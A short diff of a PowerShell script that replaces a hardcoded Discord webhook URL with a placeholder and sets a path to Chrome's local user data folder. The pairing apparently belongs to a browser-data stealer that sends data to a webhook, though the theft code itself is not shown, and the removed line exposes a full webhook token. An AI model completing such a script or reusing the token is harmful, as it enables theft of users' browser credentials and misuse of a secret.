@@ -1,5 +1,5 @@
 # Set webhook URL
-$webhookURL = "https://discord.com/api/webhooks/1059776022331002931/ci73REhGUk4KNSm3RZJmz4qyr02oOzCcqb0xx9K57Z32Q_RJ9ROTC3BGNmIllCgVz38U"
+$webhookURL = "<WEBHOOK>"
 
 # Set Chrome data path
 $chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
